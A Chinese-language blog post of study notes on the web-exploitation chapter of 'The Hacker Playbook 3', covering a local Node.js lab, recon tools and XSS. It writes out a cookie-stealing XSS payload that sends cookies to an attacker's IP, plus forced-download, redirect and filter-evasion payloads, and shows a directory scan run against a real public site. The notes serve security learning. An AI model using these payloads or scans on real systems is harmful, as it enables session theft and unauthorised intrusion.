@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+
+
+<title>THE-HACKER-PLAYBOOK-3-笔记-Web应用程序漏洞利用 | langke Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+</head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">langke&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">langke&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div id="post-toc" class="post-toc">
+            <span class="post-toc-title">catalogue</span>
+            <div class="post-toc-content">
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞赏金平台"><span class="toc-text">漏洞赏金平台</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#网络攻击介绍–Cyber-Space-Kittens"><span class="toc-text">网络攻击介绍–Cyber Space Kittens</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#红队的Web应用程序攻击"><span class="toc-text">红队的Web应用程序攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#聊天支持系统实验"><span class="toc-text">聊天支持系统实验</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#什么是Node？"><span class="toc-text">什么是Node？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Cyber-Space-Kittens-聊天支持系统"><span class="toc-text">Cyber Space Kittens:聊天支持系统</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#设置你的Web应用程序攻击机器"><span class="toc-text">设置你的Web应用程序攻击机器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析-Web应用程序"><span class="toc-text">分析 Web应用程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#网络探测"><span class="toc-text">网络探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS跨站脚本攻击"><span class="toc-text">XSS跨站脚本攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#经过混淆的XSS-payload和XSS-Polyglot"><span class="toc-text">经过混淆的XSS payload和XSS Polyglot</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Blind-XSS漏洞"><span class="toc-text">Blind XSS漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NodeJS-中的高级-XSS"><span class="toc-text">NodeJS 中的高级 XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#从-XSS-到-SHELL"><span class="toc-text">从 XSS 到 SHELL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#反序列化攻击"><span class="toc-text">反序列化攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#模板引擎攻击–模板注入"><span class="toc-text">模板引擎攻击–模板注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JavaScript-和远程代码执行"><span class="toc-text">JavaScript 和远程代码执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#服务器端请求伪造（SSRF）"><span class="toc-text">服务器端请求伪造（SSRF）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XML-外部实体攻击（XXE）"><span class="toc-text">XML 外部实体攻击（XXE）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#高级-XXE-–-XXE-OOB"><span class="toc-text">高级 XXE – XXE-OOB</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#本章总结"><span class="toc-text">本章总结</span></a></li></ol>
+            </div>
+        </div>
+    
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">THE-HACKER-PLAYBOOK-3-笔记-Web应用程序漏洞利用</h1>
+            
+                <div class="post-meta">
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">04 11&nbsp;&nbsp;21:51:49</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <section class="post-content">
+            <p>一旦公司开始加强其外部网络环境并开始进行外部渗透测试，我们作为攻击者，就要转而针对“第8层”攻击–将社会工程学攻击（网络钓鱼）作为第一切入点。现在，正如我们看到的，各个组织通过新一代终端防护/防火墙来提高其内部安全性，所以我们的重点又转回了应用程序的漏洞利用。我们还看到应用程序、API和编程语言的复杂性大幅增加，使得许多旧的甚至是新的漏洞重新出现。</p>
+<a id="more"></a>
+<p>由于本书更多针对红队行动的概念，因此我们不会深入研究所有不同的Web漏洞或是如何手动利用它们。这本书并不是一本字典类型的参考工具书。你将关注的是红队队员和坏人在现实世界中所能看到的漏洞，例如哪些危害到PII(个人验证信息)、IP、网络等的漏洞。对于那些正在寻找非常详细的Web渗透测试方法的人，我总是建议从OWASP测试指南开始<a href="https://www.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents" target="_blank" rel="noopener">https://www.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents</a>和<a href="https://www.owasp.org/images/1/19/OTGv4.pdf" target="_blank" rel="noopener">https://www.owasp.org/images/1/19/OTGv4.pdf</a></p>
+<h1 id="漏洞赏金平台"><a href="#漏洞赏金平台" class="headerlink" title="漏洞赏金平台"></a>漏洞赏金平台</h1><p>有一点需要注意：平均而言，在你开始不断发现漏洞之前，需要大约3-6个月的沉淀时间。我们的建议是：不要感到沮丧，与其他漏洞赏金猎人保持交流，而且不要忘记可以去看看老一点的漏洞赏金项目。<br>比较常见的漏洞赏金平台：</p>
+<ul>
+<li><a href="https://www.hackerone.com/" target="_blank" rel="noopener">HackerOne</a></li>
+<li><a href="https://bugcrowd.com/programs" target="_blank" rel="noopener">BugCrowd</a></li>
+<li><a href="https://www.synack.com/red-team/" target="_blank" rel="noopener">SynAck</a></li>
+<li><a href="https://www.vulnerability-lab.com/list-of-bug-bounty-programs.php" target="_blank" rel="noopener">其他</a></li>
+</ul>
+<p>还有就是，漏洞赏金平台挖洞的时候不要越界。</p>
+<h1 id="网络攻击介绍–Cyber-Space-Kittens"><a href="#网络攻击介绍–Cyber-Space-Kittens" class="headerlink" title="网络攻击介绍–Cyber Space Kittens"></a>网络攻击介绍–Cyber Space Kittens</h1><p>对于本章中的所有攻击，都可以使用一个本书定制的VMWare虚拟机来复现这些实验。这个虚拟机可以在以下网站免费下载：</p>
+<ul>
+<li><a href="http://thehackerplaybook.com/get.php?type=csk-web" target="_blank" rel="noopener">http://thehackerplaybook.com/get.php?type=csk-web</a><br>为搭建演示Web实验环境（客户支持系统）：</li>
+<li><p>从以下位置下载本书的VMWare虚拟机：</p>
+<ul>
+<li><a href="http://thehackerplaybook.com/get.php?type=csk-web" target="_blank" rel="noopener">http://thehackerplaybook.com/get.php?type=csk-web</a></li>
+</ul>
+</li>
+<li><p>下载在实验环境里面要用到的完整命令列表：</p>
+<ul>
+<li><a href="https://github.com/cheetz/THP-ChatSupportSystem/blob/master/lab.txt" target="_blank" rel="noopener">https://github.com/cheetz/THP-ChatSupportSystem/blob/master/lab.txt</a></li>
+</ul>
+</li>
+<li><p>启动并登录VM（虚拟机）</p>
+</li>
+<li>当VM完全启动时，它应该显示应用程序的当前IP地址。你无需登录进VM，所以登录密码也不需要。你可以自行入侵这个程序</li>
+<li>由于这是一个托管在你自己系统上的Web应用程序，因此我们在攻击端Kali系统上创建一个主机名记录：<ul>
+<li>在我们的攻击端Kali虚拟机上，让我们编辑host文件以指向我们的存在漏洞的应用程序（客户支持系统），以便可以通过hostname和IP来引用应用程序：<ul>
+<li><code>gedit /etc/hosts</code></li>
+</ul>
+</li>
+<li>添加客户支持系统虚拟机的IP<ul>
+<li><code>[客户支持系统的IP] chat</code></li>
+</ul>
+</li>
+<li>现在，打开Kali的浏览器并访问<code>http://char:3000/</code>。如果一切正常，你应该能够看到NodeJS自定义的客户支持系统程序。</li>
+</ul>
+</li>
+</ul>
+<h2 id="红队的Web应用程序攻击"><a href="#红队的Web应用程序攻击" class="headerlink" title="红队的Web应用程序攻击"></a>红队的Web应用程序攻击</h2><p>Web应用程序测试的一个很好的资源是<code>Open Web Application Security Project</code>，简称OWASP<br>OWASP侧重于应用程序的安全开发和用户教育。每隔几年，OWASP都会编制并发布一个最常见漏洞的清单<a href="https://www.owasp.org/images/3/3c/OWASP_Top_10_-_2017_Release_Candidate1_English.pdf" target="_blank" rel="noopener">https://www.owasp.org/images/3/3c/OWASP_Top_10_-_2017_Release_Candidate1_English.pdf</a><br>一个更深层次的测试指南位于这里：<a href="https://www.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents" target="_blank" rel="noopener">https://www.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents</a><br>这里有一个很好的清单文档：<a href="https://github.com/tanprathan/OWASP-Testing-Checklist" target="_blank" rel="noopener">https://github.com/tanprathan/OWASP-Testing-Checklist</a></p>
+<h2 id="聊天支持系统实验"><a href="#聊天支持系统实验" class="headerlink" title="聊天支持系统实验"></a>聊天支持系统实验</h2><p>将被攻击的聊天支持系统是交互式的，它突出了新的和旧的漏洞。应用程序本身是用Node.js编写的。为什么选择Node？作为渗透测试人员，我们要注意的是，它是使用率增长最快的应用程序之一。由于许多开发人员似乎都非常喜欢Node，所以我觉得理解将Javascript作为后端代码运行的安全含义是很重要的。</p>
+<h3 id="什么是Node？"><a href="#什么是Node？" class="headerlink" title="什么是Node？"></a>什么是Node？</h3><p>“Node.js® 是一个基于 Chrome V8引擎的 JavaScript 运行环境。Node.js 使用了一个事件驱动、非阻塞式 I/O 的模型，使其轻量又高效。”Node.js 的包生态系统，即 NPM，是世界上最大的开源库生态系统。<br>在最基本的层面上，Node.js 允许你在浏览器之外运行 JavaScript。由于 Node.js 具有精简，快速和跨平台的特性，所以它可以通过统一堆栈来大大简化项目。虽然 Node.js 不是 Web 服务器，但它允许服务器（可以用 JavaScript 编程的东西）存在于实际 Web 客户端之外的环境中。<br>优点：</p>
+<ul>
+<li>非常快</li>
+<li>单线程 JavaScript 环境，可以充当独立的 Web 应用程序服务器</li>
+<li>Node.js 不是协议；它是一个用 JavaScript 编写的 Web 服务器</li>
+<li>NPM 代码仓库拥有近50万个免费、可重用的 Node.js 代码包，这使它成为世界上最大的包管理器</li>
+</ul>
+<p>随着 Node.js 在过去几年变得如此流行，对于渗透测试人员/红队成员来说，理解应该寻找什么突破口以及如何攻击这些应用程序是非常重要的。例如，一位研究人员发现，弱 NPM 凭证使他能够获取 13% 的 NPM 包的编辑和发布权限。通过依赖链，预计有52% 的 NPM 包是易受攻击的。</p>
+<h1 id="Cyber-Space-Kittens-聊天支持系统"><a href="#Cyber-Space-Kittens-聊天支持系统" class="headerlink" title="Cyber Space Kittens:聊天支持系统"></a>Cyber Space Kittens:聊天支持系统</h1><p>你偶然发现了面向外部网络的CSK聊天支持系统。当你慢慢筛选所有页面并了解底层系统时，你会在应用程序中寻找其弱点。你需要在服务器中找到第一个入口点，以便可以转入入侵生产环境。</p>
+<h2 id="设置你的Web应用程序攻击机器"><a href="#设置你的Web应用程序攻击机器" class="headerlink" title="设置你的Web应用程序攻击机器"></a>设置你的Web应用程序攻击机器</h2><p>虽然对于红队要面对的Web应用程序，并没有什么完美的入侵方法，但是你需要一些基本工具包括：</p>
+<ul>
+<li><p>用浏览器武装自己。许多浏览器的行为都非常不同，尤其是复杂的XSS规避机制：</p>
+<ul>
+<li>Firefox</li>
+<li>Chrome</li>
+<li>Safari</li>
+</ul>
+</li>
+<li><p>Wappalyzer：一种跨平台的实用程序，可以揭示网站上使用的技术。它可以检测内容管理系统，电子商务平台，Web框架，服务器软件，分析工具等等。</p>
+<ul>
+<li><a href="https://wappalyzer.com/" target="_blank" rel="noopener">https://wappalyzer.com/</a></li>
+</ul>
+</li>
+<li><p>BuiltWith：一个网站分析工具。在查找页面时，BuiltWith会返回它在页面上可以找到的所有技术。BuiltWith的目标是帮助开发人员，研究人员和设计人员找出正在使用的技术页面，这可以帮助他们决定自己采用哪些技术。</p>
+<ul>
+<li><a href="https://builtwith.com/" target="_blank" rel="noopener">https://builtwith.com/</a></li>
+</ul>
+</li>
+<li><p>Retire.JS：扫描Web应用程序所使用的易受攻击的JavaScript库。Retire.js的目标是帮助你检测具有已知漏洞的版本的使用情况。</p>
+<ul>
+<li><a href="https://chrome.google.com/webstore/detail/retirejs/moibopkbhjceeedibkbkbchbjnkadmom" target="_blank" rel="noopener">https://chrome.google.com/webstore/detail/retirejs/moibopkbhjceeedibkbkbchbjnkadmom</a></li>
+</ul>
+</li>
+<li><p>Burp Suite：约350美元，虽然这个商业工具有点贵，但绝对物有所值，对于渗透测试人员和红队队员来说。他的好处来自附加组件，模块化设计和用户开发基础。如果你买不起Burp，可以去用破解版。OWASP ZAP是一个很好的替代品。</p>
+</li>
+</ul>
+<h2 id="分析-Web应用程序"><a href="#分析-Web应用程序" class="headerlink" title="分析 Web应用程序"></a>分析 Web应用程序</h2><p>在我们进行任何类型的扫描之前，尝试理解底层代码和基础结构非常重要。我们可以用上面提到的插件去了解后端运行的是什么代码。盲目攻击网站之前了解目标应用程序可以帮助你提供更好的思路。这也有助于入侵可能有WAF的目标站点，允许你使用更多的攻击手法。<br><img src="https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/黑客秘籍3/wappalyzer插件效果图.jpg" alt></p>
+<h2 id="网络探测"><a href="#网络探测" class="headerlink" title="网络探测"></a>网络探测</h2><p>我们将假设你已经设置好了Burp Suite，并且你使用的是本书的Kali镜像。一旦我们了解了底层系统，我们就需要识别所有断点。我们仍然需要运行与之前相同的探测工具。</p>
+<ul>
+<li><p>Burp Suite</p>
+<ul>
+<li>爬虫：Burp Suite有一个很棒的爬虫工具</li>
+<li>内容探测：如果你使用的是付费版本的Burp Suite，那么最受欢迎的探测工具之一就是Discover Content。这是一个只能高效的工具，可以查找目录和文件。你还可以为扫描指定多种不同的配置。</li>
+<li>主动扫描：运行所有参数的自动漏洞扫描并测试多个Web漏洞。</li>
+</ul>
+</li>
+<li><p><a href="https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project" target="_blank" rel="noopener">OWASP ZAP</a></p>
+<ul>
+<li>类似于Burp，但完全开源和免费。具有类似的探测和主动扫描功能。</li>
+</ul>
+</li>
+<li><p><a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project" target="_blank" rel="noopener">Dirbuster</a></p>
+<ul>
+<li>一个很久以前就被开发出来的旧工具，用于发现Web应用程序的文件/文件夹，但现在仍然可以顺利的完成工作。</li>
+<li>目标网址：<a href="http://char:3000" target="_blank" rel="noopener">http://char:3000</a></li>
+<li>字典：<ul>
+<li>/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><a href="https://github.com/OJ/gobuster" target="_blank" rel="noopener">GoBuster</a></p>
+<ul>
+<li>非常轻量级、快速的目录和子域名爆破工具</li>
+<li>gobuster -u <a href="http://chat:3000" target="_blank" rel="noopener">http://chat:3000</a> -w /opt/SecLists/Discovery/Web-Content/raft-small-directories.txt -s 200,301,307 -t 20</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@thp3:/opt/gobuster<span class="comment"># ./gobuster -u http://www.baidu.com -w /opt/SecLists/Discovery/Web-Content/raft-small-directories.txt -s 200,307 -t 20</span></span><br><span class="line"></span><br><span class="line">Gobuster v1.4.1              OJ Reeves (@TheColonial)</span><br><span class="line">=====================================================</span><br><span class="line">=====================================================</span><br><span class="line">[+] Mode         : dir</span><br><span class="line">[+] Url/Domain   : http://www.baidu.com/</span><br><span class="line">[+] Threads      : 20</span><br><span class="line">[+] Wordlist     : /opt/SecLists/Discovery/Web-Content/raft-small-directories.txt</span><br><span class="line">[+] Status codes : 200,307</span><br><span class="line">=====================================================</span><br><span class="line">/home (Status: 200)</span><br><span class="line">/s (Status: 200)</span><br><span class="line">=====================================================</span><br></pre></td></tr></table></figure>
+<p>你的字典列表非常重要。我最喜欢使用的一个汇总的字典列表是一个名为raft的旧字典，它是许多开源项目的集合。你可以在这里找到这些和其他有价值的字典列表：<a href="https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content" target="_blank" rel="noopener">https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content</a> (已包含在本书的Kali镜像中)。</p>
+<p>现在既然我们已经完成了概述，让我们进行一些攻击吧。从红队的角度来看，我们正在寻找可以主动攻击的漏洞，并为我们提供最大的帮助。如果我们正在进行评估或渗透测试，我们可能会报告漏洞扫描程序中的 SSL 问题，默认Apache 页面或其他漏洞扫描程序发现的不可利用的漏洞等。但是，在我们的红队工作中，我们可以完全忽略这些，并专注于能使我们获得高级访问权限，shell 或 转储 PII 的攻击。</p>
+<h2 id="XSS跨站脚本攻击"><a href="#XSS跨站脚本攻击" class="headerlink" title="XSS跨站脚本攻击"></a>XSS跨站脚本攻击</h2><p>我们都知道XSS攻击时客户端攻击，允许攻击者创建特定的Web请求从而将恶意代码注入响应中。这通常可以通过客户机和服务器端的适当输入验证来修复，但这绝不是那么容易。为什么这么说？因为XSS漏洞由多种原因造成的。从编码不规范到不理解框架，有时候应用程序变得过于复杂，旧很难理解一个输入点的安全性。</p>
+<p>因为仅仅弹窗确实没有真正的危害，让我们从一些基本类型的XSS攻击开始：</p>
+<ul>
+<li><p>Cookie窃取XSS:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">document</span>.write(<span class="string">'&lt;img src="http//&lt;YourIP&gt;/Stealer.php?cookie='</span>%<span class="number">2</span>B <span class="built_in">document</span>.cookie %<span class="number">2</span>B<span class="string">'"/&gt;'</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>强制下载文件：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="keyword">var</span> link = <span class="built_in">document</span>.createElement(<span class="string">'a'</span>); link.href=<span class="string">'http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe'</span>; link.download =<span class="string">''</span>;<span class="built_in">document</span>.body.appendChild(link); link.click();&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>重定向用户：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">window</span>.location = <span class="string">"https://www.youtube.com/watch?v=dQw4w9WgXcQ"</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>其他脚本以启用键盘记录器，拍照等：</p>
+<ul>
+<li><a href="http://www.xss-payloads.com/payloads-list.html?c#category=capture" target="_blank" rel="noopener">http://www.xss-payloads.com/payloads-list.html?c#category=capture</a></li>
+</ul>
+</li>
+</ul>
+<h3 id="经过混淆的XSS-payload和XSS-Polyglot"><a href="#经过混淆的XSS-payload和XSS-Polyglot" class="headerlink" title="经过混淆的XSS payload和XSS Polyglot"></a>经过混淆的XSS payload和XSS Polyglot</h3><p>我们会遇到一些应用程序过滤字符或应用程序有WAF防护的情况。有两个很好的资源可以帮助你开始制作混淆的XSS payload攻击：</p>
+<ul>
+<li><a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" target="_blank" rel="noopener">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</a>  </li>
+<li><a href="https://github.com/foospidy/payloads/tree/master/other/xss" target="_blank" rel="noopener">https://github.com/foospidy/payloads/tree/master/other/xss</a></li>
+</ul>
+<p>一些不需要使用<code>&lt;script&gt;</code>标签的payload：</p>
+<ul>
+<li><code>&lt;b onmouseover=alert(&#39;XSS&#39;)&gt;Click Me!&lt;/b&gt;</code></li>
+<li><code>&lt;svg onload=alert(1)&gt;</code></li>
+<li><code>&lt;body onload=&quot;alert(&#39;XSS&#39;)&quot;&gt;</code></li>
+</ul>
+<p><strong>XSS的其他优秀资源：</strong></p>
+<ul>
+<li><p>第一个是由@jackmasa制作的思维导图。这是一个很棒的文档，它根据输入点的位置来分解不同的XSS payload。最然不再在jackMasa GitHub页面上，<a href="https://raw.githubusercontent.com/cyberspacekittens/XSS/master/XSS2.png" target="_blank" rel="noopener">这里提供一个副本</a></p>
+</li>
+<li><p>另一个很好的资源，讨论哪些浏览器容易受到哪些XSS payload的影响：<a href="https://html5sec.org/" target="_blank" rel="noopener">https://html5sec.org/</a></p>
+</li>
+<li><p>最后一种类型的payload称为<a href="https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot" target="_blank" rel="noopener">Polyglot</a>,Polyglot payload采用许多不同类型的payload和混淆技术，并将它们编译成一次攻击。这适用于想使用自动脚本查找XSS、时间有限的漏洞赏金项目，或者仅仅想要快速发现输入验证存在哪些问题等情况。</p>
+</li>
+</ul>
+<h2 id="Blind-XSS漏洞"><a href="#Blind-XSS漏洞" class="headerlink" title="Blind XSS漏洞"></a>Blind XSS漏洞</h2><p>攻击者/用户看不到存储的XSS payload的执行（无回显），只有管理员或后台员工才能看到。由于其攻击后端用户的能力，所以这种攻击可能危害很大，但尽管如此，它还是经常被遗忘。</p>
+<p>例如，我们假设某个应用程序有一个“联系我们”页面，允许用户向管理员提供联系信息，以便以后联系。由于该数据的结果只能由管理员手动查看而不是用户请求查看，所以如果应用程序易受XSS攻击，攻击者不会立即看到他们的”alert(1)”攻击的回显。在这些情况下，我们可以使用<a href="https://xsshunter.com/" target="_blank" rel="noopener">XSSHunter</a>来帮助我们验证Blind XSS漏洞。</p>
+<p>XSSHunter的工作原理是，当我们的JavaScript payload执行时，它将截取受害者屏幕（他们正在查看的当前页面）的屏幕截图，并将该数据发送回XSSHunter的站点。发生这种情况时，XSSHunter将发送一个警报，告知我们的payload已执行并向我们提供所有详细信息。我们现在可以回去创建一个恶意payload并重新进行我们的攻击。</p>
+<ul>
+<li>XSS Hunter：<ul>
+<li>禁用任何代理（即Burp Suite）</li>
+<li>在<a href="https://xsshunter.com/" target="_blank" rel="noopener">https://xsshunter.com/</a>创建账户</li>
+<li>登录<a href="https://xsshunter.com/app" target="_blank" rel="noopener">https://xsshunter.com/app</a></li>
+<li>转到 Payload 模块以获得你的 Payload</li>
+<li>修改 Payload 以适应你的攻击或使用它构建 Polyglot</li>
+<li>检查 XSS Hunter 以查看 payload 执行情况</li>
+</ul>
+</li>
+</ul>
+<h2 id="NodeJS-中的高级-XSS"><a href="#NodeJS-中的高级-XSS" class="headerlink" title="NodeJS 中的高级 XSS"></a>NodeJS 中的高级 XSS</h2><p>在高级 XSS 部分中，你将学习一些特定语言的 XSS 漏洞发挥作用的示例。我们的 NodeJS Web 应用程序将使用一种更常见的 Web 堆栈和配置。此实现包括 <a href="https://expressjs.com/" target="_blank" rel="noopener">Express Framework</a> 和<a href="https://pugjs.org/api/getting-started.html" target="_blank" rel="noopener">Pug 模板引擎</a>。重要的是要注意一点，默认情况下，Express确实没有内置的 XSS 防护，除非通过模板引擎进行渲染。当使用像 Pub 这样的模板引擎时，有两种常见的方法可以找到 XSS 漏洞：（1）通过字符串插值，（2）缓冲代码。</p>
+<p>模板引擎有一个字符串插值的概念，这是一种定义“字符串变量的占位符”的奇特方式。例如，让我们将字符串分配给 Pug 模板格式的变量：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- <span class="keyword">var</span> title = <span class="string">"This is the HTML Title"</span></span><br><span class="line">- <span class="keyword">var</span> THP = <span class="string">"Hack the Planet"</span></span><br><span class="line">h1 #&#123;title&#125;</span><br><span class="line">p The Hacker Playbook will teach you how to #&#123;THP&#125;</span><br></pre></td></tr></table></figure></p>
+<p>请注意， #{THP} 是 THP 之前分配的变量的占位符。我们通常会在电子邮件分发消息中看到这些模板。你是否收到<br>过来自 ${first_name} …的自动化系统发送的电子邮件而不是你的真实名字？这正是模板引擎的用途。<br>当上面的模板代码呈现为 HTML 时，它将如下所示:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>This is the HTML Title<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>The Hacker Playbook will teach you how to Hack the Planet<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>幸运的是，在这种情况下，我们使用 #{} 字符串插值，这是 Pug 插值的转义版本。如你所见，通过使用模板，我们可以创建可重用性非常高的代码并使模板非常轻量级。</p>
+<p>Pug 支持转义和非转义字符串插值。隐藏和未转义之间的区别是什么？好吧，使用转义字符串插值将对 &lt; ， &gt; ， ‘和 “ 之类的字符进行 HTML 编码。这将有助于向用户提供输入验证。如果开发人员使用非转义字符串插值，这通常会导致 XSS 漏洞。</p>
+<p>此外，字符串插值（或变量插值，变量替换或变量扩展）是评估包含一个或多个占位符的字符串文字的过程，从而产生一个结果，其中占位符替换为其对应的值。<a href="https://en.wikipedia.org/wiki/String_interpolation" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/String_interpolation</a></p>
+<ul>
+<li><p>在 Pug 隐藏和非转义字符串插值<a href="https://pugjs.org/language/interpolation.html" target="_blank" rel="noopener">https://pugjs.org/language/interpolation.html</a></p>
+<ul>
+<li>!{}-非转义字符串插值</li>
+<li>#{}-转义字符串插值*虽然这是转义的,但如果直接通过 JavaScript 传递它仍然可能容易受到 XSS 的攻击</li>
+</ul>
+</li>
+<li><p>在 JavaScript 中，未转义的缓冲区代码以“!=”开头。“!=”之后的任何内容都将自动作为 JavaScript 执行。<a href="https://pugjs.org/language/code.html#unescaped-buffered-code" target="_blank" rel="noopener">https://pugjs.org/language/code.html#unescaped-buffered-code</a></p>
+</li>
+<li><p>最后，只要允许插入原始 HTML ，就有可能存在 XSS 。</p>
+</li>
+</ul>
+<p>在复杂的应用程序上触发 XSS 并不容易。很容易忽视或误解框架如何处理输入和输出。因此，在为 Pug/NodeJS 应用程序执行源代码审查时，在源代码中搜索 !{ ， #{ 或 ${ 有助于可能触发 XSS 的位置。了解上下文，以及是否需要在该上下文中进行转义，这是至关重要的，我们将在以下示例中看到。尽管这些攻击特定于 Node 和 Pug，但每种语言都存在针对 XSS 和输入验证的问题。你将无法运行漏洞扫描程序或XSS 模糊测试工具并找到所有 XSS 漏洞。但你确实需要了解所使用的语言和框架。</p>
+<h2 id="从-XSS-到-SHELL"><a href="#从-XSS-到-SHELL" class="headerlink" title="从 XSS 到 SHELL"></a>从 XSS 到 SHELL</h2><p>我经常遇到的一个问题是，我如何通过 XSS 获取 Shell？尽管有许多不同的方法可以做到这一点，但我们通常会发现，如果我们可以让用户在内容管理系统（CMS）或类似系统中获得管理员的 XSS，那么这可能会导致系统完全受损。可以在这里找到 Hans-Michael 完整的演练示例和代码：<a href="https://github.com/Varbaek/xsser" target="_blank" rel="noopener">https://github.com/Varbaek/xsser</a> 。 Hans-Michael提供了一些关于重建 XSS 到 RCE 攻击的精彩示例和视频。<br>自己实践：<br>    开始以为所有的xss都可以用，后来发现只适合部分cms的部分版本。没有找到响应的版本，也就没试。只把工具下载下来了。</p>
